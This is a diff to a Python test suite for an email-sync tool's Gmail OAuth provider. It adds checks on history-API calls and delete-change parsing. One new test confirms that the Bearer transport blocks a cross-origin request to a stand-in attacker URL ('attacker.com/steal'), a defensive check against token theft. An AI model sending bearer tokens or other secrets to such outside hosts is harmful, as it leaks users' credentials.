@@ -121,15 +121,28 @@ def test_factory_wires_gmail_oauth_and_not_configured_without_ref():
     def api(method, url, params, headers):
         api_calls.append((method, url, headers.get("Authorization")))
         assert headers["Authorization"] == "Bearer tok"
+        assert "gmail.googleapis.com" in url
+        assert "/gmail/v1/users/me/history" in url
+        assert params.get("startHistoryId") == "1"
+        assert params.get("labelId") == "INBOX"
         return {
-            "@odata.deltaLink": "https://graph/delta?t=1",
-            "value": [],
+            "history": [
+                {
+                    "id": "1",
+                    "messagesDeleted": [{"message": {"id": "del-1"}}],
+                }
+            ],
+            "historyId": "100",
         }
 
     acc = Account(email="a@g.com", provider="gmail", credential_ref="oauth:gmail")
     provider = build_provider(acc, store, token_http=token_post, api_http=api)
     out = provider.delta_changes("INBOX", {"historyId": "1"})
     assert out.exhausted
+    assert out.next_cursor == {"historyId": "100"}
+    assert len(out.changes) == 1
+    assert out.changes[0].kind == "delete"
+    assert out.changes[0].remote_id == "del-1"
     assert api_calls and "Bearer tok" in api_calls[0][2]
 
     bare = Account(email="b@g.com", provider="gmail", credential_ref="")
@@ -204,3 +217,25 @@ def test_env_store_is_read_only(monkeypatch):
     with pytest.raises(ReadOnlyCredentialRef):
         store.put_secret("env:KK_TEST_SECRET", "other")
     assert store.get_secret("env:KK_TEST_SECRET") == "s3cret"
+
+
+def test_bearer_transport_blocks_cross_origin():
+    store = DictCredentialStore(
+        {
+            "oauth:g": json.dumps(
+                {
+                    "refresh_token": "rt",
+                    "client_id": "c",
+                    "client_secret": "s",
+                    "token_uri": "https://oauth2.googleapis.com/token",
+                    "access_token": "valid",
+                    "expires_at": time.time() + 9999,
+                }
+            )
+        }
+    )
+    client = OAuthTokenClient(credential_ref="oauth:g", store=store, provider="gmail")
+    transport = BearerTransport(token_client=client, inner=lambda *a, **k: {}, base_url="https://gmail.googleapis.com")
+    with pytest.raises(OAuthError, match="cross-origin Bearer request denied"):
+        transport("GET", "https://attacker.com/steal")
+
